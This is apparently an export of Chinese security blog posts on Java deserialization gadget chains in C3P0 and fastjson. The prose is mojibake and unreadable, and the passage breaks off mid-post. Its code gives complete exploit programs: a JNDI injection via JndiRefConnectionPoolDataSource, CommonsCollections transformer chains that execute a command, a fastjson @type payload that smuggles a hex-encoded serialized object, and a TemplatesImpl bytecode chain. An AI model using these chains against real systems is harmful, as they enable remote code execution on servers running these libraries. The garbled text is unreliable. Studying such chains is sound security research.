è¿è¡ŒæŠ¥é”™ï¼Œå¹¶ä¸”è°ƒè¯•ä¹Ÿè°ƒè¯•ä¸åŠ¨ï¼ŒæŸ¥çœ‹æŠ¥é”™å†…å®¹ï¼š\nå¯ä»¥çœ‹åˆ°ä¸»è¦æ˜¯å’Œä¸€ä¸ªreregisteræœ‰å…³ï¼Œåœ¨æƒ³æ˜¯ä¸æ˜¯JndiRefConnectionPoolDataSourceçš„çˆ¶ç±»å®ç°äº†readObject()ï¼Œç®€å•è·Ÿè¿›äº†IdentityTokenResolvableç±»ï¼Œç¡®å®å­˜åœ¨æŠ¥é”™ä¸­å¼¹å‡ºçš„å‡ ä¸ªæ–¹æ³•ï¼š\nåœ¨è¿™é‡Œæˆ‘çœ‹åˆ°äº†ä¸€ä¸ªC3P0Registry.reregister()æ–¹æ³•ï¼Œæƒ³åˆ°äº†åœ¨åˆå§‹åŒ–JndiRefConnectionPoolDataSourceç±»æ—¶ä¹Ÿæœ‰è¿™æ–¹é¢çš„ä»£ç ï¼š\nä¸ºäº†æ–¹ä¾¿æˆ‘æŠŠautoregisterè®¾ç½®æˆäº†falseï¼Œå¯ä»¥å°‘åˆ†æä¸€äº›ä»£ç ï¼Œé‚£ä¹ˆè¿™é‡Œå°†å…¶è®¾ç½®ä¸ºtrueå°è¯•ä¸€ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 package C3P0; import com.alibaba.fastjson.JSONObject; import com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource; import javax.management.BadAttributeValueExpException; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; public class Main{ public static void main(String[] args) throws Exception{ JndiRefConnectionPoolDataSource jndiRefConnectionPoolDataSource = new JndiRefConnectionPoolDataSource(); jndiRefConnectionPoolDataSource.setJndiName(\u0026#34;rmi://127.0.0.1:1099/Hello\u0026#34;); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;fupanc\u0026#34;,jndiRefConnectionPoolDataSource); BadAttributeValueExpException bad = new BadAttributeValueExpException(null); Field f = bad.getClass().getDeclaredField(\u0026#34;val\u0026#34;); f.setAccessible(true); f.set(bad,jsonObject); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(bad); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } } æˆåŠŸå¼¹å‡ºè®¡ç®—æœºã€‚\nå“¦å“¦å“¦å“¦ï¼ŒæˆåŠŸäº†ï¼ï¼ï¼\nä½†æ˜¯åœ¨è°ƒè¯•è¿‡ç¨‹ä¸­ï¼Œå¯ä»¥å‘ç°æ˜¯è°ƒç”¨çš„å¦å¤–çš„getteræ–¹æ³•ï¼Œè€Œä¸æ˜¯æˆ‘ä»¬æƒ³è¦åˆ©ç”¨çš„getLoginTimeout()æ–¹æ³•ï¼š\nå½±å“ä¸å¤§ï¼Œå› ä¸ºJndiRefForwardingDataSourceç±»çš„getLogWriter()æ–¹æ³•ä¹Ÿæ˜¯è°ƒç”¨äº†inner()æ–¹æ³•çš„ï¼Œä¹Ÿæ˜¯å‰é¢ä¸€ç›´éƒ½åœ¨æˆªå›¾ä¸­è¡¨ç°å‡ºæ¥çš„ï¼š\næœ€åæˆåŠŸåœ¨ååºåˆ—åŒ–è°ƒç”¨é“¾ä¸­å®ç°jndiæ³¨å…¥ï¼Œåé¢çœ‹äº†ä¸€ä¸‹ï¼Œromeé“¾åº”è¯¥ä¹Ÿå¯ä»¥è§¦å‘è¿™ä¸ªgetteræ–¹æ³•ä»è€Œæ¥æ‰“jndiæ³¨å…¥ï¼Œé“¾å­å°±ä¸æ“äº†ï¼Œéƒ½å·®ä¸å¤šçš„ã€‚\nç»¼ä¸Šï¼Œæœ‰ä¸‰ä¸ªåˆ©ç”¨ç‚¹ã€‚\nHexåºåˆ—åŒ– è¿™é‡Œåˆ©ç”¨åˆ°çš„ç±»æ˜¯WrapperConnectionPoolDataSourceï¼Œè¿™ä¸ªç±»ä½äºcom.mchange.v2.c3p0.WrapperConnectionPoolDataSourceï¼Œå…¶å®å‰é¢æ‰“jndié‚£é‡Œéƒ½æ˜¯è¯´è¿‡çš„ã€‚åœ¨è¿™é‡Œå¯ä»¥ç”¨æ¥æ‰“äºŒæ¬¡ååºåˆ—åŒ–ã€‚\nâ€”â€”â€”â€”â€”â€”â€”â€”\nå®šä½åˆ°è¿™ä¸ªç±»çš„æ„é€ æ–¹æ³•ï¼š\nè¿™é‡Œå…ˆåˆ†æå›¾ä¸­æ¡†å‡ºæ¥çš„æ–¹æ³•ï¼Œåœ¨å‚æ•°ä¼ é€’ä¸­ï¼Œè¿™é‡Œä¼šè°ƒç”¨getUserOverridesAsString()æ–¹æ³•ï¼Œè¿™é‡Œä¼šè°ƒç”¨åˆ°çˆ¶ç±»WrapperConnectionPoolDataSourceBaseçš„getUserOverridesAsString()æ–¹æ³•ï¼š\nä¼šè¿”å›è¿™ä¸ªå€¼ã€‚\né‚£ä¹ˆç°åœ¨è·Ÿè¿›C3P0ImplUtilsç±»çš„parseUserOverridesAsString()æ–¹æ³•ï¼š\nå¯ä»¥çœ‹åˆ°å¯¹å­—ç¬¦ä¸²è¿›è¡Œäº†æˆªå–æ“ä½œï¼Œè·å–çš„HASM_HEADERå˜é‡é•¿åº¦ç„¶åå†è¿›è¡Œçš„æˆªå–ï¼Œçœ‹ä¸€ä¸‹è¿™ä¸ªå˜é‡çš„å®šä¹‰ï¼š\nå¯ä»¥çœ‹åˆ°æ˜¯æœ‰ç¡¬ç¼–ç è¿›å»çš„å˜é‡ï¼Œç„¶åæˆ‘æ³¨æ„åˆ°è¿™é‡Œçš„ä¸€ä¸ªæ–¹æ³•ï¼šcreateUserOverridesAsString()ï¼Œä¸ç®¡æ˜¯æ–¹æ³•åæˆ–è€…è¿™é‡Œé€»è¾‘ï¼Œæ„Ÿè§‰éƒ½éå¸¸ç¬¦åˆå‰é¢çš„æˆªå–æ“ä½œï¼Œæ–¹æ³•ä¸­é—´è°ƒç”¨çš„SerializableUtils.toByteArrayæ˜¯ä¸€ä¸ªåºåˆ—åŒ–æ“ä½œï¼Œè·Ÿè¿›å°±çŸ¥é“äº†ï¼Œå¹¶ä¸”å¤–é¢å¥—çš„ByteUtilsç±»çš„toHexAscii()æ–¹æ³•æ˜¯ä¸€ä¸ªhexç¼–ç çš„æ“ä½œï¼Œå’Œåé¢çš„åˆ†æä¹Ÿéå¸¸ç¬¦åˆï¼Œè¿™ä¹ˆå·§ï¼Ÿå…ˆä¸ç®¡ï¼Œåç»­åˆ©ç”¨çš„æ—¶å€™å†çœ‹çœ‹ã€‚\nç„¶åè°ƒç”¨äº†ByteUtilsç±»çš„fromHexAscii()æ–¹æ³•ï¼Œè¿™æ˜¯ä¸€ä¸ªhexè§£ç çš„æ“ä½œï¼Œç„¶åå†è·Ÿè¿›ä¼šè°ƒç”¨çš„SerializableUtilsç±»çš„fromByteArray()æ–¹æ³•ï¼š\nå†è·Ÿè¿›deserializeFromByteArray()æ–¹æ³•ï¼š\nè¿™é‡Œæœ‰ä¸€ä¸ªååºåˆ—åŒ–çš„æ“ä½œï¼Œé‚£ä¹ˆç°åœ¨å°±æ˜¯çœ‹æ€ä¹ˆæ§åˆ¶è¿™ä¸ªbyteså˜é‡äº†ã€‚\nä»å‰é¢çš„åˆ†æä¸­ï¼Œæˆ‘ä»¬å…¶å®å·²ç»å¯æ§è¿™ä¸ªuserOverridesAsStringå˜é‡äº†ï¼Œå”¯ä¸€é—®é¢˜å°±æ˜¯æ€ä¹ˆè¿›è¡Œåˆ©ç”¨ï¼Œç›´æ¥çœ‹ä¸€ä¸ªæ­£é¢ä½¿ç”¨ä¾‹å­ï¼Œå†æ…¢æ…¢åˆ†æï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 package C3P0; import com.mchange.v2.c3p0.impl.C3P0ImplUtils; import com.mchange.v2.c3p0.WrapperConnectionPoolDataSource; import java.lang.reflect.Field; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.util.HashMap; import java.util.Map; import java.lang.Runtime; public class Main{ public static void main(String[] args) throws Exception{ Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainpart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;open -a Calculator\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); Map haha = new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashMap hashMap = new HashMap(); hashMap.put(outerMap,\u0026#34;fupanc\u0026#34;); haha.remove(\u0026#34;fupanc\u0026#34;);//è¿™é‡Œæ³¨æ„fupancæ‰€å±å¯¹è±¡ï¼Œä½¿ç”¨lazyä¹Ÿè¡Œ Field x = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); x.setAccessible(true); x.set(chain,chainpart); WrapperConnectionPoolDataSource wrapperConnectionPoolDataSource = new WrapperConnectionPoolDataSource(); String hex = C3P0ImplUtils.createUserOverridesAsString(hashMap); System.out.println(hex); wrapperConnectionPoolDataSource.setUserOverridesAsString(hex); } } è¿è¡Œå¼¹å‡ºè®¡ç®—æœºã€‚ç°åœ¨è‚¯å®šè¿˜å­˜åœ¨ç–‘é—®ï¼Œä¸æ˜¯åªåœ¨å®ä¾‹åŒ–æ—¶æ‰ä¼šè°ƒç”¨parseUserOverridesAsString()æ–¹æ³•ï¼Œä»è€Œå¯ä»¥è§¦å‘åˆ°ååºåˆ—åŒ–ï¼Œä½†æ˜¯åˆšå¼€å§‹åºåˆ—åŒ–æ—¶æ˜¯æ²¡æœ‰å€¼çš„ï¼Œæ˜¯è¿›è¡Œä¸äº†çš„ï¼Œæ”¾å…¥å€¼æ˜¯åœ¨åé¢çš„setUserOverridesAsString()æ–¹æ³•ä¸­ï¼Œä¸ºä»€ä¹ˆå¯ä»¥åˆ©ç”¨åˆ°å‘¢ï¼Ÿå…¶å®é‡ç‚¹å°±æ˜¯è¿™ä¸ªsetUserOverridesAsString()æ–¹æ³•ï¼Œçœ‹åç»­åˆ†æã€‚\nè¿™é‡Œè¦å…ˆè¯´æ˜å‡ ä¸ªç‚¹ï¼š\nå¯¹äºhexç¼–ç ä»¥åŠé•¿åº¦æ§åˆ¶ï¼Œæˆ‘è¿™é‡Œæ˜¯ç›´æ¥åˆ©ç”¨çš„C3P0ImplUtilsç±»çš„createUserOverridesAsString()æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•è¦æ±‚å‚æ•°ä¸ºMapç±»å‹ï¼š\nå¹¶ä¸”è¿™ä¸ªæ–¹æ³•æ˜¯é™æ€æ–¹æ³•ï¼Œè°ƒç”¨é™æ€æ–¹æ³•å¯é€šè¿‡ç±»åè®¿é—®æˆ–è€…å¯¹è±¡è®¿é—®ã€‚æ‰€ä»¥æˆ‘è¿™é‡Œæ˜¯é€šè¿‡C3P0ImplUtils.createUserOverridesAsString()æ–¹æ³•ç›´æ¥ç”Ÿæˆçš„éœ€è¦çš„æ•°æ®ã€‚\nå½“ç„¶å¦‚æœæ˜¯ç½‘ä¸Šçš„åˆ©ç”¨æ–¹æ³•ï¼Œåº”è¯¥æ˜¯å¯ä»¥æ¥å…¶ä»–çš„å…¥å£ç±»çš„ï¼Œæˆ‘è¿™é‡Œå°±åªèƒ½æ¥Mapå®ç°å¯¹è±¡ã€‚\nâ€”â€”â€”\nç°åœ¨å†æ¥çœ‹è¿™ä¸ªsetUserOverridesAsString()æ–¹æ³•ï¼Œå¯ä»¥åœ¨CCé“¾çš„Transformæ–¹æ³•æ‰“ä¸€ä¸ªæ–­ç‚¹æ¥çœ‹è°ƒç”¨æ ˆï¼Œæ¯”è¾ƒå…³é”®çš„å°±æ˜¯å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 readObject:371, ObjectInputStream (java.io) deserializeFromByteArray:144, SerializableUtils (com.mchange.v2.ser) fromByteArray:123, SerializableUtils (com.mchange.v2.ser) parseUserOverridesAsString:318, C3P0ImplUtils (com.mchange.v2.c3p0.impl) vetoableChange:110, WrapperConnectionPoolDataSource$1 (com.mchange.v2.c3p0) fireVetoableChange:375, VetoableChangeSupport (java.beans) fireVetoableChange:271, VetoableChangeSupport (java.beans) setUserOverridesAsString:387, WrapperConnectionPoolDataSourceBase (com.mchange.v2.c3p0.impl) main:36, Main (C3P0) è°ƒè¯•è·Ÿè¿›setUserOverridesAsString()æ–¹æ³•ï¼š\nåŸå…ˆçš„userOverridesAsStringæœ¬æ¥å°±æ²¡æœ‰èµ‹å€¼ï¼Œæ‰€ä»¥ä¸ºnullï¼Œè·Ÿè¿›eqOrBothNull()æ–¹æ³•ï¼š å¾ˆæ­£å¸¸ä¼šè¿”å›falseï¼Œçœ‹è¿™é‡Œçš„vcså˜é‡çš„å®šä¹‰ï¼š\nçœ‹ä¸€ä¸‹VetoableChangeSupportç±»çš„å®ä¾‹åŒ–ï¼š\næ‰€ä»¥è¿™é‡Œçš„vcså˜é‡å®šä¹‰å¦‚ä¸‹æ˜¯éå¸¸æ­£å¸¸çš„ï¼š\næ‰€ä»¥ä¼šè°ƒç”¨åˆ°VetoableChangeSupportç±»çš„fireVetoableChange()æ–¹æ³•ï¼š\nå®ä¾‹åŒ–äº†ä¸€ä¸ªPropertyChangeEventç±»ï¼Œæ•ˆæœå¦‚ä¸‹ï¼š\nå†å›å»çœ‹ï¼Œä¼šè°ƒç”¨åˆ°å¦ä¸€ä¸ªé‡è½½çš„fireVetoableChange()æ–¹æ³•ï¼Œæ¯”è¾ƒå…³é”®çš„å¦‚ä¸‹ä»£ç ï¼š\nç„¶åä¼šè°ƒç”¨åˆ°WrapperConnectionPoolDataSourceç±»çš„setUpPropertyListeners()æ–¹æ³•ï¼Œå…¶å®è¿™ä¸ªæ–¹æ³•åœ¨WrapperConnectionPoolDataSourceç±»åˆå§‹åŒ–äº‹ä¹Ÿè°ƒç”¨äº†çš„ï¼Œçœ‹è¿™ä¸ªæ–¹æ³•å†…éƒ¨ï¼š å¯ä»¥çœ‹åˆ°å†æ¬¡è°ƒç”¨äº†C3P0ImplUtilsç±»çš„parseUserOverridesAsString()æ–¹æ³•ï¼Œè¿™é‡Œçš„è¿‡ç¨‹å°±å’Œå‰é¢åˆ†æçš„å·®ä¸å¤šäº†ï¼Œå°±ä¸å¤šèµ˜è¿°äº†ã€‚\næ‰€ä»¥è¿™é‡Œå°±æ˜¯åˆ©ç”¨åˆ°è¿™ä¸ªsetteræ–¹æ³•å³å¯ï¼Œåœ¨fastjsonä¸­çš„æ‰“æ³•å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 package C3P0; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; import com.mchange.v2.c3p0.impl.C3P0ImplUtils; import java.lang.reflect.Field; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.util.HashMap; import java.util.Map; import java.lang.Runtime; public class Main{ public static void main(String[] args) throws Exception{ Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainpart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;open -a Calculator\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); Map haha = new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashMap hashMap = new HashMap(); hashMap.put(outerMap,\u0026#34;fupanc\u0026#34;); haha.remove(\u0026#34;fupanc\u0026#34;);//è¿™é‡Œæ³¨æ„fupancæ‰€å±å¯¹è±¡ï¼Œä½¿ç”¨lazyä¹Ÿè¡Œ Field x = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); x.setAccessible(true); x.set(chain,chainpart); String hex = C3P0ImplUtils.createUserOverridesAsString(hashMap); System.out.println(hex); String json = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\\\u0026#34;,\\\u0026#34;userOverridesAsString\\\u0026#34;:\\\u0026#34;\u0026#34;+hex+\u0026#34;\\\u0026#34;}\u0026#34;; // System.out.println(json); JSONObject obj = JSON.parseObject(json); } } è¿è¡Œå¼¹å‡ºè®¡ç®—æœºã€‚\nå¯¹äºè¿™ä¸€éƒ¨åˆ†çš„è¯´æ³•ï¼Œè¿™ä¸€ç¯‡å…ˆçŸ¥æ–‡ç« çš„è¯´æ³•ä¹Ÿæ˜¯æŒºæœ‰æ„æ€çš„ï¼Œç›‘å¬æ”¹å˜ç„¶åè¿›è¡Œå¤„ç†ï¼šhttps://xz.aliyun.com/news/11340\nè¿™æ ·çš„è¯å°±åˆ©ç”¨ä¸äº†ï¼Œç›‘å¬å±æ€§ï¼Œé‚£ä¹ˆè‚¯å®šæ˜¯éœ€è¦ç±»çš„å±æ€§æœ‰æ”¹å˜ï¼Œå¯¹äºgetteræ–¹æ³•çš„è°ƒç”¨æ˜¯æ— æ³•è¿›è¡Œçš„ã€‚\næœ€åï¼Œå…¶å®ä¸Šé¢çš„ç‚¹å¤§éƒ¨åˆ†éƒ½æ˜¯è°ƒç”¨çš„setterï¼Œåªæ˜¯æˆ‘æ‰¾åˆ°äº†ä¸€æ¡è§¦å‘getterçš„ååºåˆ—åŒ–è°ƒç”¨é“¾ï¼Œè°ƒç”¨setteréƒ½æ˜¯ä½¿ç”¨çš„fastjsonï¼Œæ¡£æ¡ˆä½¿ç”¨jacksonåº”è¯¥ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚\nå‚è€ƒæ–‡ç« ï¼š\nhttps://nivi4.notion.site/C3P0-5f394336d9604e8ca80e0bb55c4ce473\n","date":"2025-04-27T22:53:06+08:00","permalink":"https://fupanc-w1n.github.io/p/c3p0/","title":"C3P0"},{"content":"fastjsonååºåˆ—åŒ–è°ƒç”¨é“¾åˆ†æ å‰é¢å­¦äº†fastjsonååºåˆ—åŒ–ï¼Œä»jsonå­—ç¬¦ä¸²çš„ååºåˆ—åŒ–æ¥è¿›è¡Œpayloadæ„é€ ï¼Œè¿™é‡Œæ¥äº†è§£ä¸€ä¸‹fastjsonåŸç”Ÿååºåˆ—åŒ–ï¼Œä¹Ÿå°±æ˜¯æ¯”è¾ƒå¸¸æ‰“çš„ååºåˆ—åŒ–è°ƒç”¨é“¾ã€‚\nFastjson\u0026lt;=1.2.48\u0026amp;2 è¿™é‡Œä»¥1.2.48ç‰ˆæœ¬ä¸ºä¾‹è¿›è¡Œæ„é€ ï¼Œåœ¨fastjson1ç‰ˆæœ¬ä¸‹çš„\u0026gt;=1.2.49éœ€è¦æœ‰ä¸€å®šçš„ç»•è¿‡æ–¹æ³•ï¼Œè¿™ä¸ªåé¢ä¼šè®²ã€‚\nè¿™é‡Œå¯ä»¥åˆ©ç”¨çš„ç±»æ˜¯JSONObjectä»¥åŠJSONArrayç±»ï¼Œå­˜åœ¨åˆ©ç”¨ç‚¹çš„æ˜¯è¿™ä¸¤ä¸ªç±»çš„toString()æ–¹æ³•ï¼Œè¿™ä¸¤ä¸ªç±»æœ¬èº«æ²¡æœ‰å®ç°toString()æ–¹æ³•ï¼Œä½†æ˜¯è¿™ä¸¤ä¸ªç±»çš„çˆ¶ç±»éƒ½æ˜¯JSONç±»ï¼ŒJSONå®ç°çš„toString()æ–¹æ³•å¦‚ä¸‹ï¼š\nè¿™ä¸ªtoString()æ–¹æ³•è°ƒç”¨äº†toJSONString()æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•ä¹Ÿæ¯”è¾ƒç†Ÿæ‚‰äº†ï¼Œå°±æ˜¯JSONåºåˆ—åŒ–è°ƒç”¨çš„æ–¹æ³•ï¼Œå¯ä»¥è°ƒç”¨åˆ°å¯¹åº”ç±»çš„getteræ–¹æ³•ï¼Œç°åœ¨çš„æ€è·¯å°±æ˜¯åºåˆ—åŒ–JSONObjectæˆ–è€…JSONArrayç±»ï¼Œé‚£ä¹ˆè¿™é‡Œçš„å…·ä½“è¿‡ç¨‹æ˜¯ä»€ä¹ˆå‘¢ï¼Œä¸ªäººç®€å•ä»ä»£ç å±‚é¢è·Ÿè¿›äº†ä¸€ä¸‹åŸç†ï¼ˆå¯èƒ½æœ‰è¯¯ï¼‰ï¼š\nJSONObejcté“¾ è·Ÿè¿›toJSONString()æ–¹æ³•ï¼š ä¼šè°ƒç”¨JSONSerializerç±»çš„write()æ–¹æ³•ï¼Œæ³¨æ„å‚æ•°çš„ä¼ é€’ï¼Œä¹Ÿå°±æ˜¯è¿™é‡Œçš„thisä»£è¡¨æˆ‘ä»¬æƒ³è¦åˆ©ç”¨çš„JSONObjectç±»ï¼Œå€¼å¾—ä¸€æçš„æ˜¯JSONSerializerç±»çš„configå˜é‡ï¼Œåé¢ä¼šç”¨ï¼š\ngetGlobalInstance()æ–¹æ³•è¿”å›çš„å…¶å®å°±æ˜¯SerializeConfigç±»å®ä¾‹ï¼Œè‡ªå·±è·Ÿä¸€ä¸‹å°±çŸ¥é“äº†ã€‚\nç„¶åè·Ÿè¿›JSONSerializerç±»çš„write()æ–¹æ³•ï¼š è¿™é‡Œä¼šè°ƒç”¨getObjectWriter()æ–¹æ³•ï¼Œç„¶åä¼šè°ƒç”¨SerializeConfigç±»çš„getObjectWriter()æ–¹æ³•ï¼š\nå¦‚ä¸‹ï¼š\næ³¨æ„å‚æ•°ä¼ é€’ï¼Œé‚£ä¹ˆè¿™é‡Œçš„clazzå°±æ˜¯JSONObjectçš„Classå¯¹è±¡ï¼Œç°åœ¨æ³¨æ„ç‚¹æ”¾åœ¨serializerså˜é‡ä¸­ï¼Œæœç´¢å‘ç°æ˜¯åœ¨SerializeConfigåˆå§‹åŒ–æ–¹æ³•ä¸­æœ‰å®šä¹‰ï¼Œæ„é€ æ–¹æ³•ä¸­å®šä¹‰initSerializers()æ–¹æ³•ç”¨äºåˆå§‹åŒ–è¿™ä¸ªå˜é‡ï¼Œé‡Œé¢æ”¾å…¥äº†ä¸€äº›é”®å€¼å¯¹ï¼š\nä½†æ˜¯å¹¶æ²¡æœ‰JSONObject.classè¿™ç§ç±»å‹çš„ï¼Œç»§ç»­çœ‹getObjectWriter()æ–¹æ³•ï¼Œåç»­å¯ä»¥çœ‹åˆ°ä¸€ä¸ªå®šä¹‰ï¼š\nè¿™é‡Œçš„isAssignableFrom()æ–¹æ³•å°±æ˜¯åˆ¤æ–­clazzæ˜¯å¦å®ç°Mapæ¥å£ï¼Œè€ŒJSONObjectç¡®å®æ˜¯å®ç°äº†è¿™ä¸ªæ¥å£ï¼Œæ‰€ä»¥è¿™é‡Œä¼šæ”¾å…¥ä¸€ä¸ªJSONObjectï¼šMapSerializerç±»å®ä¾‹çš„é”®å€¼å¯¹ï¼Œå¹¶ä¸”ä¼šåœ¨åé¢å–å€¼ç„¶åè¿”å›ï¼š\nå›åˆ°JSONSerializerç±»çš„write()æ–¹æ³•ï¼Œç„¶åä¼šè°ƒç”¨MapSerializerç±»çš„write()æ–¹æ³•ï¼Œå…ˆæ˜¯è·å–åˆ°JSONObjectç±»çš„mapå˜é‡ï¼š ç„¶åforå¾ªç¯å¯¹mapä¸­çš„é”®å€¼å¯¹è¿›è¡Œå¤„ç†ï¼Œå…³æ³¨åˆ°è¿™ä¸ªæ–¹æ³•ä¸­å¯¹valueçš„å¤„ç†å¦‚ä¸‹ï¼š ä¸€æ¬¡å®Œæ•´çš„åºåˆ—åŒ–è¿‡ç¨‹ï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯å¯ä»¥è°ƒç”¨åˆ°getteræ–¹æ³•ï¼Œé‚£ä¹ˆå°±å¯ä»¥å°è¯•æ‰“TemplatesImplç±»çš„getOutputProperties()æ–¹æ³•äº†ï¼Œè°ƒç”¨toString()æ–¹æ³•çš„è¯å°±è¿˜æ˜¯ä½¿ç”¨CC5çš„å³å¯ï¼Œæ‰€ä»¥å¯ä»¥æ„é€ POCå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 package org.example; import javax.management.BadAttributeValueExpException; import com.alibaba.fastjson.JSONObject; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.io.*; import java.lang.reflect.Field; public class Main{ public static void main(String[] args) throws Exception { //ä½¿ç”¨javassistå®šä¹‰æ¶æ„ä»£ç  ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;fupanc\u0026#34;,templates); BadAttributeValueExpException bad = new BadAttributeValueExpException(null); Field field = bad.getClass().getDeclaredField(\u0026#34;val\u0026#34;); field.setAccessible(true); field.set(bad, jsonObject); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(bad); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } è¿è¡ŒåæˆåŠŸå¼¹å‡ºè®¡ç®—æœºã€‚å†æ¬¡è°ƒè¯•ï¼Œè¿‡ç¨‹ä¸åˆ†æçš„åŸºæœ¬ç›¸åŒï¼Œæœ‰ä¸€ç‚¹æœ‰é”™ï¼Œè·å–JSONObjectçš„mapå¹¶æ²¡æœ‰æŒ‰ç…§é¢„æœŸï¼š\nè€Œæ˜¯ç›´æ¥åœ¨forå¾ªç¯é‚£é‡Œè°ƒç”¨å¯¹åº”æ–¹æ³•è¿”å›çš„å€¼ï¼š\nJSONObjectç±»çš„entrySet()æ–¹æ³•ï¼š\nå…¶ä»–çš„å°±å·®ä¸å¤šäº†ã€‚\nJSONArrayé“¾ è¿™ä¸ªå…¶å®ä¹Ÿæ˜¯å’Œå‰é¢JSONObjectè¿‡ç¨‹æ˜¯å·®ä¸å¤šçš„ï¼Œåªæ˜¯JSONArrayç±»å®ç°çš„æ˜¯List.classï¼Œå¯¹åº”çš„è·å–åˆ°çš„writerå°±æ˜¯ListSerializerç±»å®ä¾‹ï¼š\nä¹Ÿå°±æ˜¯ä¼šè°ƒç”¨ListSerializerç±»çš„writer()æ–¹æ³•ï¼Œè¿™ä¸ªwriteræ–¹æ³•åŒæ ·æ˜¯è°ƒç”¨äº†forå¾ªç¯æ¥è¿›è¡Œè·å–å€¼å¹¶åºåˆ—åŒ–çš„æ“ä½œï¼Œå¤§ä½“è¿‡ç¨‹å¦‚ä¸‹ï¼š\nèµ‹å€¼ï¼š\nforå¾ªç¯å–å€¼ï¼š 